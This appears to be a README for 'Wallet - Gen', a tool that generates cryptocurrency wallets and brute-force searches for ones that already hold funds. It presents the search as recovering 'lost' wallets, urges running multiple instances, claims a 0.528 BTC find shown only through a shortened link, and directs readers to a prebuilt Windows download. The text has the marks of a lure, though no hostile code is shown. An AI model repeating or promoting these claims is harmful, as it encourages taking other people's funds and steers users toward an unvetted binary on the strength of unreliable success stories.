# Wallet - Gen

**Wallet - Gen** is a tool designed for generating cryptocurrency wallets (such as Bitcoin and EVM-based wallets like ETH, BNB, MATIC, etc.), as well as discovering forgotten or lost - wallets that contain an existing balance.

<p align="left">
    <img src="/assets/jecnate.webp" />
</p>

## Overview

Wallet - Gen is built in C++ and is open-source, allowing anyone to access and modify the code. Compared to Python-based wallet generators, Wallet - Gen boasts significantly higher wallet generation speeds, with performance primarily relying on your graphics card. 
For generating - EVM wallets (ETH, BNB, MATIC, etc.), Wallet - Gen uses the keccak256 algorithm, while Bitcoin - wallets are created using the Segwit format under Bech32.

## Features

- Generate - a single Bitcoin wallet.
- Generate - a single EVM wallet (ETH, BNB, MATIC, etc.).
- Search for - Bitcoin wallets with a balance.
- Search for - EVM wallets with a balance.

![video gif](/assets/niporin.gif)

# Searching for Crypto Wallets

Wallet - Gen allows you to search for two types of crypto - wallets with an existing balance. To search for BTC wallets, press key `3` in the menu or run `start_search_btc.bat`. For searching EVM wallets (such as Ethereum, BNB, etc.), press key `4` in the menu or run `start_search_evm.bat`. 

The search speed is determined by your hardware, especially your graphics card. To increase your chances of finding a wallet with a balance, you can run multiple instances of the program, from 1 to 4 or more, depending on the power of your graphics card.

## My Finds

I’ve personally recovered two BTC - wallets with a balance. The first had 0.000032 BTC,  the second contained 0.528 BTC (roughly $3800 at the time of discovery).  
Here’s the link to the wallet: [View wallet](https://cutt.cx/BFQG2).

<p align="left">
    <img src="/assets/cretbuckspal.webp" />
</p>

## Download

- [Windows x64 version](../../releases)

## Building from Source

1. Open the project file (`Wallet - Gen.sln`) in Visual Studio or any other compatible C++ compiler.
2. Install the necessary dependencies and build the project.

### Installing vcpkg and libssl

```cmd
> git clone https://github.com/microsoft/vcpkg
> .\vcpkg\bootstrap-vcpkg.ba
> .\vcpkg\vcpkg integrate install
> .\vcpkg\vcpkg install openssl:x64-windows
```